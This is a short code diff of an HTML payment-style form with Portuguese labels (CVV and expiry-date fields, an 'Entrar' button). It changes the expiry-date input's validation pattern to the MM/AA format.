@@ -100,7 +100,7 @@
                 <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
             </div>
             <div class="form-group">
-                <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade (MM/AA)" pattern="\d*" title="Somente números são permitidos" maxlength="5">
+                <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade (MM/AA)" pattern="\d{2}/\d{2}" title="Digite no formato MM/AA" maxlength="5">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
